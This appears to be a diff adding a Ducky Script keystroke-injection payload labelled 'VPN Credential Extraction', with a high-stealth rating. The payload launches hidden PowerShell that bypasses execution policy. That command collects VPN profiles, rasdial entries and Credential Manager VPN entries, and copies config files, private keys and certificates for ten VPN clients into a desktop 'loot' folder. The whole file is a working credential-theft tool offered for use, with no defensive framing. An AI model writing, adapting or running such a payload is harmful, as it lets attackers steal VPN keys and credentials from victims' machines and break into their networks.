@@ -1,0 +1,12 @@
+REM ============================================
+REM  FU PERSON | VPN Credential Extraction
+REM  FLLC - by PERSON FU
+REM  Time: ~10 seconds | Stealth: HIGH
+REM  Grabs VPN configs, profiles, cached creds
+REM ============================================
+DELAY 500
+GUI r
+DELAY 400
+STRING powershell -w hidden -ep bypass -c "$d=[Environment]::GetFolderPath('Desktop')+'\vpn_loot';md $d -f|Out-Null;$r=@();$r+='=== VPN CREDENTIAL DUMP ===';$r+='Time: '+(Get-Date);$r+='';$r+='=== WINDOWS VPN PROFILES ===';Get-VpnConnection -ea 0|%{$r+='Name: '+$_.Name;$r+='Server: '+$_.ServerAddress;$r+='Type: '+$_.TunnelType;$r+='Auth: '+$_.AuthenticationMethod;$r+=''};$r+='=== RASDIAL ENTRIES ===';rasdial 2>$null|%{$r+=$_};$r+='';$vpns=@{OpenVPN=\"$env:USERPROFILE\OpenVPN\config\";OpenVPN2=\"$env:APPDATA\OpenVPN\config\";WireGuard=\"$env:APPDATA\WireGuard\";GlobalProtect=\"$env:LOCALAPPDATA\Palo Alto Networks\GlobalProtect\";CiscoAnyConnect=\"$env:LOCALAPPDATA\Cisco\Cisco AnyConnect Secure Mobility Client\";FortiClient=\"$env:LOCALAPPDATA\FortiClient\";NordVPN=\"$env:LOCALAPPDATA\NordVPN\";ExpressVPN=\"$env:APPDATA\ExpressVPN\";PIA=\"$env:LOCALAPPDATA\Private Internet Access\";Mullvad=\"$env:LOCALAPPDATA\Mullvad VPN\"};foreach($v in $vpns.Keys){$p=$vpns[$v];if(Test-Path $p){$r+=\"[FOUND] $v at $p\";$vd=\"$d\$v\";md $vd -f|Out-Null;gci $p -r -fi '*.ovpn','*.conf','*.cfg','*.xml','*.json','*.ini','*.pem','*.key','*.crt' -ea 0|%{cp $_.FullName \"$vd\$($_.Name)\" -f 2>$null;$r+='  -> '+$_.Name}};$r+=''};$r+='=== CREDENTIAL MANAGER (VPN entries) ===';cmdkey /list 2>$null|?{$_ -match 'vpn|ras|cisco|global|forti'}|%{$r+=$_};$r|Out-File \"$d\results.txt\" -Encoding UTF8"
+ENTER
+DELAY 500
